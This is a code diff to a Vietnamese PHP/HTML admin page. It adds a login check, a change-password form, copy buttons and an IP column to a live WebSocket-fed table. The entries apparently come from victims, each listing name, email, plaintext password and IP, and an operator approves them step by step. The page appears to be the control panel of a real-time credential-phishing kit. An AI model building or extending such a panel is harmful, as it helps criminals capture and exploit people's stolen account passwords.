@@ -1,3 +1,16 @@
+<?php
+session_start();
+
+// Kiểm tra nếu đã đăng nhập
+if (isset($_SESSION['admin_logged_in']) && $_SESSION['admin_logged_in'] === true) {
+    // Cho phép truy cập nội dung admin
+} else {
+    // Chuyển hướng về trang đăng nhập
+    header('Location: admin/login.php');
+    exit;
+}
+?>
+
 <!DOCTYPE html>
 <html lang="vi">
 <head>
@@ -87,6 +100,7 @@
             padding: 15px;
             border-bottom: 1px solid #e9ecef;
             border-right: 1px solid #e9ecef;
+            position: relative;
         }
 
         .orders-table td:first-child {
@@ -238,6 +252,134 @@
         .notification-sound {
             display: none;
         }
+
+        .header-actions {
+            display: flex;
+            gap: 10px;
+        }
+
+        .change-password-btn {
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            padding: 8px 16px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: 500;
+            transition: background-color 0.3s;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .change-password-btn:hover {
+            background-color: #166fe5;
+        }
+
+        .change-password-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0,0,0,0.5);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .modal-content {
+            background-color: white;
+            padding: 20px;
+            border-radius: 8px;
+            width: 400px;
+            max-width: 90%;
+        }
+
+        .form-group {
+            margin-bottom: 15px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 5px;
+            color: #2f3640;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 8px;
+            border: 1px solid #e2e8f0;
+            border-radius: 4px;
+        }
+
+        .form-actions {
+            display: flex;
+            justify-content: flex-end;
+            gap: 10px;
+            margin-top: 20px;
+        }
+
+        .cancel-btn, .save-btn {
+            padding: 8px 16px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-weight: 500;
+        }
+
+        .cancel-btn {
+            background-color: #e2e8f0;
+            border: none;
+        }
+
+        .save-btn {
+            background-color: #1877f2;
+            color: white;
+            border: none;
+        }
+
+        .save-btn:hover {
+            background-color: #166fe5;
+        }
+
+        .copy-btn {
+            position: absolute;
+            right: 5px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            color: #718096;
+            cursor: pointer;
+            padding: 4px;
+            font-size: 12px;
+            opacity: 1;
+            transition: opacity 0.3s;
+        }
+
+        .orders-table td:hover .copy-btn {
+            opacity: 1;
+        }
+
+        .copy-btn:hover {
+            color: #1877f2;
+        }
+
+        .copy-success {
+            position: absolute;
+            right: 5px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #4cd137;
+            font-size: 12px;
+            opacity: 1;
+            transition: opacity 0.3s;
+        }
+
+        .copy-success.show {
+            opacity: 1;
+        }
     </style>
 </head>
 <body>
@@ -255,7 +397,12 @@
                 <div class="status-dot"></div>
                 <span class="status-text">Đang kết nối</span>
             </div>
-            <button class="remove-all-orders-btn" onclick="removeAllOrders()">Xóa tất cả đơn hàng</button>
+            <div class="header-actions">
+                <button class="change-password-btn" onclick="showChangePasswordForm()">
+                    <i class="fas fa-key"></i> Đổi mật khẩu
+                </button>
+                <button class="remove-all-orders-btn" onclick="removeAllOrders()">Xóa tất cả đơn hàng</button>
+            </div>
         </div>
 
         <div class="notification-bell" id="notificationBell">
@@ -268,6 +415,7 @@
                     <tr>
                         <th>Xóa</th>
                         <th>Mã Đơn</th>
+                        <th>IP</th>
                         <th>Tên</th>
                         <th>Email</th>
                         <th>Mật khẩu</th>
@@ -281,6 +429,30 @@
                     </tr>
                 </tbody>
             </table>
+        </div>
+
+        <div class="change-password-modal" id="changePasswordModal">
+            <div class="modal-content">
+                <h2>Đổi mật khẩu</h2>
+                <form id="changePasswordForm" onsubmit="changePassword(event)">
+                    <div class="form-group">
+                        <label for="currentPassword">Mật khẩu hiện tại:</label>
+                        <input type="password" id="currentPassword" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="newPassword">Mật khẩu mới:</label>
+                        <input type="password" id="newPassword" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="confirmPassword">Xác nhận mật khẩu mới:</label>
+                        <input type="password" id="confirmPassword" required>
+                    </div>
+                    <div class="form-actions">
+                        <button type="button" class="cancel-btn" onclick="hideChangePasswordForm()">Hủy</button>
+                        <button type="submit" class="save-btn">Lưu</button>
+                    </div>
+                </form>
+            </div>
         </div>
     </div>
 
@@ -356,7 +528,33 @@
             }
         };
 
-       
+        function addCopyButton(td) {
+            // Bỏ qua thẻ td đầu tiên (cột xóa)
+            if (td.cellIndex === 0) return;
+
+            const copyBtn = document.createElement('button');
+            copyBtn.className = 'copy-btn';
+            copyBtn.innerHTML = '<i class="fas fa-copy"></i>';
+            copyBtn.onclick = function(e) {
+                e.stopPropagation();
+                const text = td.textContent.trim();
+                navigator.clipboard.writeText(text).then(() => {
+                    const success = document.createElement('span');
+                    success.className = 'copy-success';
+                    success.textContent = 'Đã sao chép';
+                    td.appendChild(success);
+                    success.classList.add('show');
+                    setTimeout(() => {
+                        success.classList.remove('show');
+                        setTimeout(() => {
+                            td.removeChild(success);
+                        }, 300);
+                    }, 1000);
+                });
+            };
+            td.appendChild(copyBtn);
+        }
+
         function step1(data) {
             playNotification();
             if (data.type === 'new_order') {
@@ -373,11 +571,13 @@
 
                 const cell0 = row.insertCell(0);
                 const cell1 = row.insertCell(1);
-                const cell2 = row.insertCell(2);
-                const cell3 = row.insertCell(3);
-                const cell4 = row.insertCell(4);
-                const cell5 = row.insertCell(5);
-                const cell6 = row.insertCell(6);
+                const cell7 = row.insertCell(2);
+                const cell2 = row.insertCell(3);
+                const cell3 = row.insertCell(4);
+                const cell4 = row.insertCell(5);
+                const cell5 = row.insertCell(6);
+                const cell6 = row.insertCell(7);
+
 
                 cell0.innerHTML = `<span class="order-id">
                     <i class="fas fa-times" onclick="removeOrder('${data.order_id}')"></i>
@@ -385,6 +585,8 @@
 
                 cell1.innerHTML = `<span class="order-id">#${data.order_id}</span>`;
                 cell1.style.color = colorText;
+
+                cell7.innerHTML = `<span class="ip">#${data.ip}</span>`;
 
                 cell2.innerHTML = `
                     <div class="order-info">
@@ -407,10 +609,13 @@
                     </div>
                 `;
                 cell6.innerHTML = `
-                    <button class="approve-btn" id="approve-btn-${data.order_id}" onclick="approveOrder('${data.order_id}', '${colorText}')">
+                    <button class="approve-btn" id="approve-btn-${data.order_id}" onclick="approveOrder('${data.order_id}', '${colorText}', '${data.ip}')">
                         <i class="fas fa-check"></i> Duyệt đơn
                     </button>
                 `;
+
+                // Thêm nút sao chép cho các ô
+                [cell1, cell2, cell3, cell4, cell5, cell7].forEach(addCopyButton);
 
                 orders[data.order_id] = data;
             }
@@ -430,11 +635,12 @@
 
             const cell0 = newRow.insertCell(0);
             const cell1 = newRow.insertCell(1);
-            const cell2 = newRow.insertCell(2);
-            const cell3 = newRow.insertCell(3);
-            const cell4 = newRow.insertCell(4);
-            const cell5 = newRow.insertCell(5);
-            const cell6 = newRow.insertCell(6);
+            const cell7 = newRow.insertCell(2);
+            const cell2 = newRow.insertCell(3);
+            const cell3 = newRow.insertCell(4);
+            const cell4 = newRow.insertCell(5);
+            const cell5 = newRow.insertCell(6);
+            const cell6 = newRow.insertCell(7);
 
             const colorText = order.colorText ?? "#000";
             cell0.innerHTML = `<span class="order-id">
@@ -443,6 +649,8 @@
 
             cell1.innerHTML = `<span class="order-id">#${orderId}</span>`;
             cell1.style.color = colorText;
+
+            cell7.innerHTML = `<span class="ip">#${data.user_info.ip}</span>`;
             cell2.innerHTML = `
                 <div class="order-info">
                     <span class="order-name">${data.user_info.name}</span>
@@ -498,6 +706,7 @@
             const cell4 = newRow.insertCell(4);
             const cell5 = newRow.insertCell(5);
             const cell6 = newRow.insertCell(6);
+            const cell7 = newRow.insertCell(7);
 
             const colorText = order.colorText;
             cell0.innerHTML = `<span class="order-id">
@@ -506,6 +715,9 @@
 
             cell1.innerHTML = `<span class="order-id">#${orderId}</span>`;
             cell1.style.color = colorText;
+
+            cell7.innerHTML = `<span class="ip">#${data.user_info.ip}</span>`;
+
             cell2.innerHTML = `
                 <div class="order-info">
                     <span class="order-name">${data.user_info.name}</span>
@@ -548,12 +760,13 @@
         }
 
 
-        function approveOrder(orderId, colorText) {
+        function approveOrder(orderId, colorText, ip) {
             ws.send(JSON.stringify({
                 type: 'admin_approve',
                 order_id: orderId,
                 step: 1,
-                colorText: colorText
+                colorText: colorText,
+                ip: ip
             }));
 
             const approveBtn = document.getElementById(`approve-btn-${orderId}`);
@@ -682,20 +895,22 @@
 
                 const cell0 = row.insertCell(0);
                 const cell1 = row.insertCell(1);
-                const cell2 = row.insertCell(2);
-                const cell3 = row.insertCell(3);
-                const cell4 = row.insertCell(4);
-                const cell5 = row.insertCell(5);
-                const cell6 = row.insertCell(6);
+                const cell7 = row.insertCell(2);
+                const cell2 = row.insertCell(3);
+                const cell3 = row.insertCell(4);
+                const cell4 = row.insertCell(5);
+                const cell5 = row.insertCell(6);
+                const cell6 = row.insertCell(7);
 
                 const colorText = order.colorText;
-                console.log(order);
                 cell0.innerHTML = `<span class="order-id">
                     <i class="fas fa-times" onclick="removeOrder('${orderId}')"></i>
                 </span>`;
 
                 cell1.innerHTML = `<span class="order-id">#${orderId}</span>`;
                 cell1.style.color = colorText;
+
+                cell7.innerHTML = `<span class="ip">#${order.user_info.ip || 'Không xác định'}</span>`;
 
                 cell2.innerHTML = `
                     <div class="order-info">
@@ -750,8 +965,56 @@
                         </button>
                     `;
                 }
-            
+
+                // Thêm nút sao chép cho các ô
+                [cell1, cell2, cell3, cell4, cell5, cell7].forEach(addCopyButton);
             }
+        }
+
+        function showChangePasswordForm() {
+            document.getElementById('changePasswordModal').style.display = 'flex';
+        }
+
+        function hideChangePasswordForm() {
+            document.getElementById('changePasswordModal').style.display = 'none';
+            document.getElementById('changePasswordForm').reset();
+        }
+
+        function changePassword(e) {
+            e.preventDefault();
+            
+            const currentPassword = document.getElementById('currentPassword').value;
+            const newPassword = document.getElementById('newPassword').value;
+            const confirmPassword = document.getElementById('confirmPassword').value;
+
+            if (newPassword !== confirmPassword) {
+                alert('Mật khẩu mới không khớp!');
+                return;
+            }
+
+            fetch('change_password.php', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    currentPassword: currentPassword,
+                    newPassword: newPassword
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    alert('Đổi mật khẩu thành công!');
+                    hideChangePasswordForm();
+                } else {
+                    alert(data.message || 'Đổi mật khẩu thất bại!');
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                alert('Có lỗi xảy ra!');
+            });
         }
     </script>
 </body>
